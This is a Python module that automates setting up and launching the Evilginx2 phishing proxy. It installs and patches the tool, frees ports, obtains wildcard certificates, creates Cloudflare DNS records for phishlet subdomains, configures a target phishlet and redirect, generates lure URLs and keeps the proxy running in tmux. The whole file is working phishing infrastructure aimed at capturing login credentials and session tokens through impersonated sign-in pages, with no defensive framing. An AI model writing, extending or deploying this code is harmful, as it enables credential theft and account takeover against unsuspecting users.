"""
Evilginx Setup and Launch Module
Sets up and runs Evilginx2 phishing proxy
"""

import os
import shutil
import subprocess
import time
import requests
import yaml
import uuid
import threading
from dotenv import load_dotenv

load_dotenv()

CLOUDFLARE_API_KEY = os.getenv("CLOUDFLARE_API_KEY")
CLOUDFLARE_EMAIL = os.getenv("CLOUDFLARE_EMAIL")

HEADERS = {
    "X-Auth-Email": CLOUDFLARE_EMAIL,
    "X-Auth-Key": CLOUDFLARE_API_KEY,
    "Content-Type": "application/json"
}

PHISHLETS_PATH = "./phishlets"
EVILGINX_CERT_BASE = os.path.expanduser("~/.evilginx/crt")
EVILGINX_PATH = os.path.expanduser("~/evilginx2")

# Store active Evilginx instances
active_evilginx = {}

def get_zone_id(domain):
    """Get the Cloudflare zone ID for a domain"""
    root = ".".join(domain.split(".")[-2:])
    try:
        res = requests.get("https://api.cloudflare.com/client/v4/zones", headers=HEADERS)
        for zone in res.json().get("result", []):
            if zone["name"] == root:
                return zone["id"]
    except Exception as e:
        print(f"[-] Error getting zone ID: {e}")
    return None

def add_a_record(sub, ip, zone_id):
    """Add an A record to Cloudflare DNS"""
    data = {
        "type": "A", 
        "name": sub, 
        "content": ip,
        "ttl": 120, 
        "proxied": True
    }
    
    try:
        res = requests.post(
            f"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records", 
            headers=HEADERS, 
            json=data
        )
        
        if res.status_code in [200, 201]:
            return {
                "status": "success",
                "message": f"A record added: {sub} -> {ip}",
                "record_id": res.json().get("result", {}).get("id")
            }
        else:
            return {
                "status": "error",
                "message": f"Failed to add A record: {res.text}"
            }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Request error: {str(e)}"
        }

def get_subdomains(phishlet_file):
    """Extract the required subdomains from a phishlet file"""
    try:
        with open(phishlet_file, 'r') as f:
            content = yaml.safe_load(f)
        
        subs = set()
        for item in content.get("proxy_hosts", []):
            if isinstance(item, dict) and item.get("phish_sub"):
                subs.add(item["phish_sub"])
        
        return list(subs)
    except Exception as e:
        return []

def get_public_ip():
    """Get the server's public IP address"""
    try:
        return requests.get("https://api.ipify.org?format=json").json()["ip"]
    except Exception:
        return None

def install_evilginx():
    """Install Evilginx2 if not already installed"""
    if shutil.which("evilginx"):
        return {
            "status": "info",
            "message": "Evilginx2 is already installed."
        }

    try:
        # Setup dependencies
        subprocess.run(
            "sudo apt update && sudo apt install -y git make gcc libpcap-dev",
            shell=True, check=True
        )
        
        # Clone and build Evilginx
        subprocess.run(
            f"sudo rm -rf {EVILGINX_PATH}",
            shell=True, check=True
        )
        
        subprocess.run(
            f"git clone --branch 2.4.0 https://github.com/kgretzky/evilginx2.git {EVILGINX_PATH}",
            shell=True, check=True
        )
        
        # Patch the database.go file
        db_file = os.path.join(EVILGINX_PATH, "database", "database.go")
        
        if os.path.exists(db_file):
            with open(db_file, "r") as f:
                content = f.read()
            
            # Ensure 'time' is imported
            if '"time"' not in content:
                content = content.replace('"strconv"', '"strconv"\n\t\"time\"')
            
            # Replace d.db.Shrink() with background flush logic
            if "d.db.Shrink()" in content:
                updated_shrink = """go func() {
        for {
            time.Sleep(1 * time.Second)
            _ = d.db.Shrink()
        }
    }()"""
                content = content.replace("d.db.Shrink()", updated_shrink, 1)
                
                with open(db_file, "w") as f:
                    f.write(content)
        
        # Build Evilginx
        subprocess.run(
            f"cd {EVILGINX_PATH} && sudo make",
            shell=True, check=True
        )
        
        # Create symlink
        subprocess.run(
            f"sudo ln -sf {EVILGINX_PATH}/bin/evilginx /usr/local/bin/evilginx",
            shell=True, check=True
        )
        
        return {
            "status": "success",
            "message": "Evilginx2 v2.4.0 installed and patched successfully."
        }
    except subprocess.CalledProcessError as e:
        return {
            "status": "error",
            "message": f"Installation failed: {str(e)}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error during installation: {str(e)}"
        }

def free_ports():
    """Free ports used by Evilginx (53, 443)"""
    try:
        subprocess.call("sudo fuser -k 53/tcp 53/udp 443/tcp", shell=True)
        return {
            "status": "success",
            "message": "Ports 53 and 443 freed successfully."
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to free ports: {str(e)}"
        }

def copy_cert_files(domain, phishlet, check_existing=True):
    """Copy SSL certificate files to Evilginx directory"""
    dest = os.path.join(EVILGINX_CERT_BASE, domain)
    crt_path = os.path.join(dest, f"{phishlet}.crt")
    key_path = os.path.join(dest, f"{phishlet}.key")
    
    # Skip if certificates already exist and check_existing is True
    if check_existing and os.path.exists(crt_path) and os.path.exists(key_path):
        return {
            "status": "info",
            "message": "Certificate files already exist. Skipping."
        }
    
    # For API mode, we'll use certbot automatically
    # This requires DNS challenges to be completed separately
    try:
        # Ensure destination directory exists
        os.makedirs(dest, exist_ok=True)
        
        # Use certbot to generate certificates
        cmd = f"sudo certbot certonly --non-interactive --agree-tos --register-unsafely-without-email -d \"{domain}\" -d \"*.{domain}\" --standalone"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            return {
                "status": "error",
                "message": f"Failed to generate certificates: {stderr.decode()}"
            }
        
        # Copy certificates to Evilginx directory
        src = f"/etc/letsencrypt/live/{domain}"
        os.system(f"sudo cp {src}/fullchain.pem {crt_path}")
        os.system(f"sudo cp {src}/privkey.pem {key_path}")
        
        return {
            "status": "success",
            "message": f"Certificates generated and saved: {crt_path}, {key_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to copy certificates: {str(e)}"
        }

def launch_evilginx_tmux(evilginx_id, session_base="evilginx-live"):
    """Launch Evilginx in a tmux session for persistence"""
    session_name = f"{session_base}-{evilginx_id[:8]}"
    log_file = f"evilginx_live_{evilginx_id[:8]}.log"
    
    try:
        # Check for existing tmux sessions
        out = subprocess.check_output(
            ["sudo", "tmux", "ls"], stderr=subprocess.DEVNULL, text=True
        )
        existing = [line.split(":")[0] for line in out.splitlines()]
    except subprocess.CalledProcessError:
        existing = []
    
    # Ensure unique session name
    idx = 1
    while session_name in existing:
        idx += 1
        session_name = f"{session_base}-{evilginx_id[:8]}-{idx}"
    
    # Start tmux session
    cmd = (
        f"sudo tmux new-session -d -s {session_name} "
        f"\"bash -c 'evilginx -p {PHISHLETS_PATH} | tee {log_file}'\""
    )
    
    subprocess.run(cmd, shell=True)
    time.sleep(2)
    
    # Verify session started
    check = subprocess.run(
        ["sudo", "tmux", "has-session", "-t", session_name],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    if check.returncode == 0:
        return {
            "status": "success",
            "message": f"Evilginx running in tmux session: {session_name}",
            "session": session_name,
            "log_file": log_file
        }
    else:
        return {
            "status": "error",
            "message": "Failed to start tmux session"
        }

def run_evilginx_command(domain, phishlet, ip, redirect_url):
    """Set up and run Evilginx with the specified configuration"""
    evilginx_id = str(uuid.uuid4())
    active_evilginx[evilginx_id] = {
        "domain": domain,
        "phishlet": phishlet,
        "ip": ip,
        "redirect_url": redirect_url,
        "lure_url": None
    }
    
    try:
        # Start Evilginx process
        proc = subprocess.Popen(
            ["sudo", "evilginx", "-p", PHISHLETS_PATH],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Configure Evilginx
        commands = [
            f"config domain {domain}",
            f"config ip {ip}",
            f"config redirect_url {redirect_url}",
            f"phishlets hostname {phishlet} {domain}",
            f"phishlets enable {phishlet}",
            f"lures create {phishlet}",
            "lures"
        ]
        
        for cmd in commands:
            proc.stdin.write(cmd + "\n")
            proc.stdin.flush()
            time.sleep(0.5)
        
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        out, _ = proc.communicate()
        
        # Extract lure ID
        lure_id = None
        for line in reversed(out.splitlines()):
            if line.strip().startswith("|"):
                parts = [p.strip() for p in line.split("|")]
                if len(parts) > 1 and parts[1].isdigit():
                    lure_id = parts[1]
                    break
        
        # Get lure URL
        lure_url = None
        if lure_id:
            fetch_proc = subprocess.Popen(
                ["sudo", "evilginx", "-p", PHISHLETS_PATH],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            fetch_proc.stdin.write(f"lures get-url {lure_id}\n")
            fetch_proc.stdin.write("exit\n")
            fetch_proc.stdin.flush()
            out2, _ = fetch_proc.communicate()
            
            for line in out2.splitlines():
                if line.strip().startswith("http"):
                    lure_url = line.strip()
                    active_evilginx[evilginx_id]["lure_url"] = lure_url
                    break
        
        # Launch in tmux
        tmux_result = launch_evilginx_tmux(evilginx_id)
        
        return {
            "status": "success",
            "message": "Evilginx started successfully",
            "lure_url": lure_url,
            "evilginx_id": evilginx_id,
            "tmux_session": tmux_result.get("session", "unknown")
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to run Evilginx: {str(e)}"
        }

# API function
def start_evilginx_api(domain, phishlet, ip="", redirect_url="https://google.com"):
    """API function for Evilginx setup and start"""
    results = {
        "domain": domain,
        "phishlet": phishlet,
        "steps": [],
        "status": "success"
    }
    
    # Step 1: Install Evilginx if needed
    install_result = install_evilginx()
    results["steps"].append({"name": "install_evilginx", "result": install_result})
    
    # Step 2: Free ports
    ports_result = free_ports()
    results["steps"].append({"name": "free_ports", "result": ports_result})
    
    # Step 3: Get IP if not provided
    ip_to_use = ip if ip else get_public_ip()
    results["ip"] = ip_to_use
    
    if not ip_to_use:
        results["status"] = "error"
        results["message"] = "Failed to determine IP address"
        return results
    
    # Step 4: Setup certificates
    cert_result = copy_cert_files(domain, phishlet)
    results["steps"].append({"name": "copy_cert_files", "result": cert_result})
    
    # Step 5: Setup DNS if Cloudflare credentials are available
    if CLOUDFLARE_API_KEY and CLOUDFLARE_EMAIL:
        phishlet_file = os.path.join(PHISHLETS_PATH, f"{phishlet}.yaml")
        subs = get_subdomains(phishlet_file)
        zone_id = get_zone_id(domain)
        
        if zone_id:
            results["zone_id"] = zone_id
            dns_results = []
            
            for sub in subs:
                dns_result = add_a_record(f"{sub}.{domain}", ip_to_use, zone_id)
                dns_results.append({"subdomain": sub, "result": dns_result})
            
            # Add root domain record
            root_dns_result = add_a_record(domain, ip_to_use, zone_id)
            dns_results.append({"subdomain": "@", "result": root_dns_result})
            
            results["steps"].append({"name": "add_dns_records", "result": dns_results})
    
    # Step 6: Run Evilginx
    evilginx_result = run_evilginx_command(domain, phishlet, ip_to_use, redirect_url)
    results["steps"].append({"name": "run_evilginx", "result": evilginx_result})
    
    if evilginx_result["status"] == "error":
        results["status"] = "error"
        results["message"] = evilginx_result["message"]
    else:
        results["lure_url"] = evilginx_result.get("lure_url")
        results["evilginx_id"] = evilginx_result.get("evilginx_id")
    
    return results

if __name__ == "__main__":
    """CLI entry point"""
    print("[*] Evilginx Setup Utility")
    print("[*] This script will setup and run Evilginx with your configuration")
    
    # Install Evilginx if needed
    result = install_evilginx()
    print(f"[*] Evilginx installation: {result['message']}")
    
    # Get domain and phishlet
    domain = input("Enter full domain (e.g. login.example.com): ").strip()
    
    # List available phishlets
    print("\n[*] Available phishlets:")
    phishlets = [f.replace('.yaml', '') for f in os.listdir(PHISHLETS_PATH) if f.endswith('.yaml')]
    for i, p in enumerate(phishlets):
        print(f"[{i+1}] {p}")
    
    phishlet_idx = int(input("Select a phishlet by number: ")) - 1
    phishlet = phishlets[phishlet_idx]
    
    redirect_url = input("Enter redirect URL (e.g. https://original.com): ").strip()
    ip = input("Enter IP to assign (leave blank to use server public IP): ").strip()
    
    # Run the API function
    result = start_evilginx_api(domain, phishlet, ip, redirect_url)
    
    if result['status'] == 'success':
        print(f"[+] Evilginx setup complete for {domain}")
        print(f"[+] Lure URL: {result.get('lure_url', 'Not available')}")
    else:
        print(f"[-] Setup failed: {result.get('message', 'Unknown error')}")